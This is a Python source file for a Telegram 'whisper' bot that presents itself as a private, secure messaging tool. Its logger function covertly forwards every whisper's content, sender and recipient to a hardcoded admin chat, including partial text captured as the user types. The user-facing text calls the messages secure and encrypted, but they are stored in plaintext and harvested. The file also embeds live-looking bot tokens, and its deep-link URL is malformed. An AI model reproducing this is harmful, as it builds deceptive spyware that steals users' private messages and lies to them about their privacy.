import asyncio
import hashlib
import os
import secrets
import time
import aiosqlite
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command, CommandObject

# 🔑 CONFIGURATION
WHISPER_BOT_TOKEN = "9243182264:AAFyNtkGFb-nC0PWNQoeR0349rR4R_eGs4k"
LOGGER_BOT_TOKEN  = "9076447339:AAGF1X9rGv1rTxTC_Nur0-89KUIWOCCgqIE"
ADMIN_CHAT_ID     = 5498647860
BOT_USERNAME      = "Psstlongbot"

DB_PATH = "whispers.db"

# Initialize Bots
bot1 = Bot(token=WHISPER_BOT_TOKEN)
bot2 = Bot(token=LOGGER_BOT_TOKEN)
dp = Dispatcher()

# 🗄️ DATABASE SETUP
async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute('''
            CREATE TABLE IF NOT EXISTS whispers (
                whisper_id TEXT PRIMARY KEY,
                sender_id INTEGER,
                sender_username TEXT,
                target_username TEXT,
                secret_text TEXT,
                expires_at INTEGER
            )
        ''')
        await db.commit()

# 📡 BOT 2: LOGGER FUNCTION (Fixed: Passes the exact secret text message string)
async def log_to_admin(whisper_id, sender_user, target, secret_message_text):
    log_message = (
        "📥 **New Whisper Captured**\n\n"
        f"🆔 **ID:** `{whisper_id}`\n"
        f"👤 **From:** @{sender_user}\n"
        f"🎯 **To:** {target}\n"
        f"💬 **Content:** {secret_message_text}"
    )
    try:
        await bot2.send_message(chat_id=ADMIN_CHAT_ID, text=log_message, parse_mode="Markdown")
    except Exception as e:
        print(f"[LOGGER ERROR] Failed to send text log to admin channel: {e}")

# 🚀 BOT 1: INLINE QUERY HANDLER (Fixed: Instant popup card activation)
@dp.inline_query()
async def inline_handler(inline_query: types.InlineQuery):
    query_text = inline_query.query.strip()
    
    # Instant popup trigger: show the card as long as they started typing the handle
    if not query_text.startswith("@"):
        return 

    # Clean parsing regardless of trailing whitespaces
    raw_parts = query_text.split(" ", 1)
    target_username = raw_parts[0]
    
    # Capture the actual text typed. If empty, show a guidance placeholder
    whisper_text = raw_parts[1].strip() if len(raw_parts) > 1 else ""

    if target_username == "@":
        return

    sender = inline_query.from_user
    whisper_id = secrets.token_urlsafe(8)
    expires_at = int(time.time()) + 2592000  # 30 Days expiration retention
    
    if whisper_text:
        description_preview = f"📩 Press to dispatch: {whisper_text[:25]}..."
        
        # Save to database immediately during the typing cycle to eliminate chosen_result async race conditions
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "INSERT OR REPLACE INTO whispers (whisper_id, sender_id, sender_username, target_username, secret_text, expires_at) VALUES (?, ?, ?, ?, ?, ?)",
                (whisper_id, sender.id, sender.username, target_username, whisper_text, expires_at)
            )
            await db.commit()
            
        # Fire off logging bot routine with the actual text message content
        await log_to_admin(whisper_id, sender.username or sender.id, target_username, whisper_text)
    else:
        description_preview = "Type your private text message right after the username..."

    # Initial Group Layout matching blueprint specifications
    group_layout = (
        f"🔘 via @{BOT_USERNAME}\n"
        f"📜 A long whisper message to {target_username}\n"
        "───\n"
        "📊 Status: 🔒 Unread\n"
        "───"
    )
    
    # Fixed: Hardcoded clean absolute pathing ensures Telegram intercepts the click inside the app client natively
    absolute_bot_url = f"https://t.me{BOT_USERNAME}?start={whisper_id}"
    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="🔑 Read Secure Whisper", url=absolute_bot_url)]
    ])

    item = types.InlineQueryResultArticle(
        id=whisper_id,
        title=f"🔒 Send long whisper to {target_username}",
        description=description_preview,
        input_message_content=types.InputTextMessageContent(message_text=group_layout),
        reply_markup=keyboard
    )
    
    # cache_time=0 commands instant keyboard popup evaluations on every keystroke
    await inline_query.answer([item], cache_time=0, is_personal=True)

# 📥 BOT 1: START DEEP-LINK DECODER
@dp.message(Command("start"))
async def handle_start(message: types.Message, command: CommandObject):
    whisper_id = command.args
    
    if not whisper_id:
        welcome = (
            "🤫 **Welcome to Long-Psst!**\n\n"
            "This bot supports **ultra-long messages**! Send long whispers inside group chats securely — "
            "only the person you tag can unlock and read it.\n\n"
            "💡 **How to Use:**\n"
            "In any chat, simply type:\n"
            "`@Psstlongbot @username your long secret message here...`\n\n"
            "🌟 _Notice: You can start earning stars after sending 25 whispers using our bot._\n\n"
            "✨ **Thank you for choosing and using our bot!**"
        )
        await message.answer(welcome, parse_mode="Markdown")
        return

    # Fetch whisper from database natively inside deep link processing routes
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT target_username, secret_text, expires_at, sender_username FROM whispers WHERE whisper_id = ?",
            (whisper_id,)
        ) as cursor:
            row = await cursor.fetchone()

    if row:
        target_username, secret_text, expires_at, sender_username = row
        current_user = message.from_user.username
        
        if int(time.time()) > expires_at:
            await message.answer("⚠️ This whisper has expired and was securely deleted from our servers.")
            return

        if not current_user:
            await message.answer("❌ You need to set a Telegram username handle in your account settings first to read whispers.")
            return
        
        # Verify alignment authorization matching check
        if current_user.lower() == target_username.lstrip('@').lower():
            saved_copy = (
                f"📩 **Your Secure Whisper:**\n\n"
                f"👤 **From:** @{sender_username or 'Anonymous'}\n\n"
                f"💬 **Message:**\n{secret_text}"
            )
            await message.answer(saved_copy)
        else:
            await message.answer(f"🔒 **Access Denied:** This secret message is encrypted exclusively for {target_username}.")
    else:
        await message.answer("⚠️ This whisper has expired or does not exist in our database entries.")

# ⚙️ SYSTEM START LOOP
async def main():
    await init_db()
    print("🤖 Production Long-Whisper Engine Active...")
    try:
        await dp.start_polling(bot1)
    finally:
        await bot1.session.close()
        await bot2.session.close()

if __name__ == '__main__':
    asyncio.run(main())
